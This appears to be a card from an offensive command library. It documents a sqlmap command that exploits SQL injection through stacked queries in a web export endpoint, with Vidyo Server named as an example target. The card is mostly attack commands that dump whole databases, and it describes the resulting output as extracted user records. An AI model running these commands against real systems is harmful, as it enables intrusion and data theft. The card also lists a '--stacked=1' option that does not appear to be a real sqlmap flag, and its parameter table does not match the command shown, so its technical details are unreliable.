---
id: cmd-sqlmap-test-001
data: >-
  sqlmap -u "http://target/export?param=test" --dbms=mysql --technique=S
  --stacked=1 --dump
tags:
  - sqli
  - exploitation
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.473Z'
verified: false
validated: true
submitted: true
---
# sqlmap-test-payload

## Command

```bash
sqlmap -u "http://target/export?param=test" --dbms=mysql --technique=S --stacked=1 --dump
```

## Description

This command uses sqlmap to test and exploit SQL injection vulnerabilities, specifically focusing on stacked queries in a web application's export functionality, such as Vidyo Server's Excel export. It identifies injectable parameters, confirms DBMS type, and dumps database contents if successful.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with vulnerable parameter | Yes |
| `--dbms` | Specify the database management system (e.g., mysql) | No |
| `--technique=S` | Use stacked query technique for injection | No |
| `--stacked=1` | Enable stacked query testing | No |
| `--dump` | Dump database tables and data | No |
| `--batch` | Non-interactive mode | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://vidyo-server/export?search=test" --batch
```

### Advanced Usage

```bash
sqlmap -u "http://vidyo-server/export?search=test" --dbms=mysql --technique=S --stacked=1 --dump-all --threads=5
```

## Expected Output

Detection messages like "[INFO] the back-end DBMS is MySQL" followed by payload testing results. On success, it generates files like `dumped_tables.csv` containing extracted data such as user records or schema details. Errors may include SQL syntax feedback confirming injection points.

## Related

- [[Related Procedure: Exploit SQL Injection in Vidyo Export Functionality]]
